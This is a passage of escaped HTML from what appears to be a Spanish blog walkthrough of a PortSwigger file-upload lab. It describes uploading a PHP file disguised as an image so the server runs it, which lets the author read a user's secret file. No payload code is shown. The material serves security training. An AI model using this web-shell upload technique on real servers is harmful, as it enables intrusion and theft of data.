-			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request1_hu91d7f59288eecbfcf42c581e55282c20_168509_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/request1_hu91d7f59288eecbfcf42c581e55282c20_168509_1024x0_resize_box_3.png 1024w&#34;
-			loading=&#34;lazy&#34;
-			alt=&#34;Subida de archivo al servidor como imagen pero en formato php&#34;&gt;
-	&lt;/a&gt;
-	
-	&lt;figcaption&gt;Subida de archivo al servidor como imagen pero en formato php&lt;/figcaption&gt;
-	
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;Ahora que hemos subido la imagen podemos ver la key y podemos notar entre todos los caracteres no legibles nuestra key, ya que todo lo esta interpretando como un php incluso los caracteres que no conoce.&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;El valor de la key empieza despues del 9 si vemos la peticion anterior notaremos como esta el valor 9 entre el contenido de la imagen antes del comentario&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;figure 
-	
-		class=&#34;gallery-image&#34; 
-		style=&#34;
-			flex-grow: 161; 
-			flex-basis: 388px&#34;
-	&gt;
-	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key.png&#34; data-size=&#34;1371x848&#34;&gt;
-		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key.png&#34;
-			width=&#34;1371&#34;
-			height=&#34;848&#34;
-			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key_hu1003bf30908932c8466cedc67dac7580_243447_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/key_hu1003bf30908932c8466cedc67dac7580_243447_1024x0_resize_box_3.png 1024w&#34;
-			loading=&#34;lazy&#34;
-			alt=&#34;Lectura de archivo secret de carlos&#34;&gt;
-	&lt;/a&gt;
-	
-	&lt;figcaption&gt;Lectura de archivo secret de carlos&lt;/figcaption&gt;
-	
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;Y con esto resolvimos el lab, pudiendo subir un archivo php que ejecuta acciones o comandos en el servidor.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	
-		class=&#34;gallery-image&#34; 
-		style=&#34;
-			flex-grow: 284; 
-			flex-basis: 682px&#34;
-	&gt;
-	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto.png&#34; data-size=&#34;1806x635&#34;&gt;
-		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto.png&#34;
-			width=&#34;1806&#34;
-			height=&#34;635&#34;
-			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu35a8ed710805121360124aa504d19757_84802_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-file-upload-lab-8/resuelto_hu35a8ed710805121360124aa504d19757_84802_1024x0_resize_box_3.png 1024w&#34;
-			loading=&#34;lazy&#34;
-			alt=&#34;Laboratorio resuelto&#34;&gt;
-	&lt;/a&gt;
-	
-	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
-	
-&lt;/figure&gt;&lt;/p&gt;
-&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
-&lt;hr&gt;
-&lt;ol&gt;
-&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
